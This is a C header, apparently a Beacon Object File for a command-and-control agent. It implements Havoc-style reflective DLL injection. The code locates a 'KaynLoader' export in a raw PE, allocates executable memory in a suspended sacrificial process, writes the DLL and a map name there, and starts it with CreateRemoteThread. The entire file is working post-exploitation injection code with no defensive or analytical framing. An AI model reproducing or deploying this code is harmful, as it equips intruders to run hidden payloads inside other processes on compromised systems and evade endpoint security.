#pragma once
/*
 * Child-only reflective host load (Havoc DllSpawn / KaynLdr style).
 *
 * Agent work is intentionally tiny: resolve KaynLoader RVA from the raw PE
 * (read-only), WriteProcessMemory the DLL + map name, CreateRemoteThread at
 * KaynLoader. All import/reloc work runs inside the sacrificial process.
 */

#include <winnt.h>

static DWORD PpfKaynRvaToOffset(const BYTE* pe, DWORD peLen, DWORD rva)
{
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS64* nt;
    IMAGE_SECTION_HEADER* sec;
    WORD i;

    if (!pe || peLen < 0x200) {
        return 0;
    }
    dos = (IMAGE_DOS_HEADER*)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > (DWORD)peLen) {
        return 0;
    }
    nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }
    if (rva < nt->OptionalHeader.SizeOfHeaders) {
        return rva;
    }
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD va = sec[i].VirtualAddress;
        DWORD vsz = sec[i].Misc.VirtualSize;
        DWORD raw = sec[i].PointerToRawData;
        DWORD rsz = sec[i].SizeOfRawData;
        if (rva >= va && rva < va + (vsz ? vsz : rsz)) {
            DWORD off = raw + (rva - va);
            if (off >= (DWORD)peLen) {
                return 0;
            }
            return off;
        }
    }
    return 0;
}

static ULONG_PTR PpfKaynGetExportRva(
    const BYTE* pe,
    int peLen,
    const char* exportName)
{
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS64* nt;
    IMAGE_DATA_DIRECTORY* dir;
    IMAGE_EXPORT_DIRECTORY* exp;
    DWORD* names;
    WORD* ords;
    DWORD* funcs;
    DWORD i;
    DWORD off;

    if (!pe || peLen < 0x200 || !exportName) {
        return 0;
    }
    dos = (IMAGE_DOS_HEADER*)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }
    nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE ||
        nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return 0;
    }
    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress || !dir->Size) {
        return 0;
    }
    off = PpfKaynRvaToOffset(pe, (DWORD)peLen, dir->VirtualAddress);
    if (!off) {
        return 0;
    }
    exp = (IMAGE_EXPORT_DIRECTORY*)(pe + off);
    names = (DWORD*)(pe + PpfKaynRvaToOffset(pe, (DWORD)peLen, exp->AddressOfNames));
    ords = (WORD*)(pe +
        PpfKaynRvaToOffset(pe, (DWORD)peLen, exp->AddressOfNameOrdinals));
    funcs = (DWORD*)(pe +
        PpfKaynRvaToOffset(pe, (DWORD)peLen, exp->AddressOfFunctions));
    for (i = 0; i < exp->NumberOfNames; i++) {
        DWORD nameOff = PpfKaynRvaToOffset(pe, (DWORD)peLen, names[i]);
        const char* n;
        if (!nameOff) {
            continue;
        }
        n = (const char*)(pe + nameOff);
        if (MSVCRT$strncmp(n, exportName, 64) == 0) {
            return (ULONG_PTR)funcs[ords[i]];
        }
    }
    return 0;
}

static BOOL PpfKaynRemoteWrite(
    HANDLE hProcess,
    LPVOID remote,
    const void* local,
    SIZE_T size)
{
    SIZE_T written = 0;
    return KERNEL32$WriteProcessMemory(
        hProcess, remote, local, size, &written) && written == size;
}

/*
 * Write raw host DLL into suspended process and start KaynLoader(mapName).
 * Primary thread stays suspended; KaynLoader → DllMain → RunHost → ExitProcess.
 */
static BOOL PpfInjectKaynHost(
    HANDLE hProcess,
    const char* hostDll,
    int hostDllLen,
    const char* mapName)
{
    ULONG_PTR kaynRva;
    LPVOID remoteDll = NULL;
    LPVOID remoteMap = NULL;
    HANDLE hThread = NULL;
    SIZE_T mapLen;
    BOOL ok = FALSE;

    if (!hProcess || !hostDll || hostDllLen < 0x200 || !mapName) {
        return FALSE;
    }

    kaynRva = PpfKaynGetExportRva((const BYTE*)hostDll, hostDllLen, "KaynLoader");
    if (!kaynRva) {
        return FALSE;
    }

    remoteDll = KERNEL32$VirtualAllocEx(
        hProcess,
        NULL,
        (SIZE_T)hostDllLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!remoteDll) {
        return FALSE;
    }
    if (!PpfKaynRemoteWrite(hProcess, remoteDll, hostDll, (SIZE_T)hostDllLen)) {
        goto done;
    }

    mapLen = MSVCRT$strlen(mapName) + 1;
    remoteMap = KERNEL32$VirtualAllocEx(
        hProcess,
        NULL,
        mapLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    if (!remoteMap || !PpfKaynRemoteWrite(hProcess, remoteMap, mapName, mapLen)) {
        goto done;
    }

    hThread = KERNEL32$CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteDll + kaynRva),
        remoteMap,
        0,
        NULL);
    if (!hThread) {
        goto done;
    }

    /* RunHost/ExitProcess happens in the child; go() waits on the process. */
    ok = TRUE;

done:
    if (hThread) {
        KERNEL32$CloseHandle(hThread);
    }
    return ok;
}
